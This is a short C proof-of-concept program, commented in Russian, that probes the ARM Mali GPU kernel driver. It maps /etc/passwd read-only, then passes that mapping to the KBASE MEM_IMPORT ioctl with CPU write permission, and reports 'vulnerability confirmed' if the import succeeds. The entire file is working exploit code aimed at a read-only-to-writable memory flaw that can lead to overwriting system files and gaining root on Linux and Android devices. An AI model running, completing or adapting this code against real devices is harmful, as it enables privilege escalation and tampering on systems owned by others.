#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

#define KBASE_IOCTL_TYPE 0x80
#define KBASE_IOCTL_MEM_IMPORT _IOWR(KBASE_IOCTL_TYPE, 22, union kbase_ioctl_mem_import)

// Структуры из заголовка
union kbase_ioctl_mem_import {
    struct {
        uint64_t flags;
        uint64_t phandle;
        uint32_t type;
        uint32_t padding;
    } in;
    struct {
        uint64_t flags;
        uint64_t gpu_va;
        uint64_t va_pages;
    } out;
};

struct base_mem_import_user_buffer {
    uint64_t ptr;
    uint64_t length;
};

// Флаги
#define BASE_MEM_PROT_CPU_RD (1u << 0)
#define BASE_MEM_PROT_CPU_WR (1u << 1)
#define BASE_MEM_PROT_GPU_RD (1u << 2)
#define BASE_MEM_IMPORT_TYPE_USER_BUFFER 2

int main() {
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) {
        printf("[-] open failed: %s\n", strerror(errno));
        return 1;
    }

    // Мапим /etc/passwd только для чтения
    int target_fd = open("/etc/passwd", O_RDONLY);
    void *addr = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, target_fd, 0);
    if (addr == MAP_FAILED) {
        printf("[-] mmap failed\n");
        return 1;
    }

    printf("[+] Mapped /etc/passwd at %p\n", addr);

    struct base_mem_import_user_buffer buf = {
        .ptr = (uint64_t)addr,
        .length = 4096
    };

    union kbase_ioctl_mem_import imp;
    memset(&imp, 0, sizeof(imp));
    imp.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD;
    imp.in.phandle = (uint64_t)&buf;
    imp.in.type = BASE_MEM_IMPORT_TYPE_USER_BUFFER;

    printf("[*] Testing ioctl(MEM_IMPORT)...\n");
    int ret = ioctl(fd, KBASE_IOCTL_MEM_IMPORT, &imp);
    
    if (ret < 0) {
        printf("[-] MEM_IMPORT failed: errno=%d (%s)\n", errno, strerror(errno));
    } else {
        printf("[+] MEM_IMPORT SUCCESS! GPU VA: 0x%llx\n", (unsigned long long)imp.out.gpu_va);
        printf("[!] УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА!\n");
    }

    return 0;
}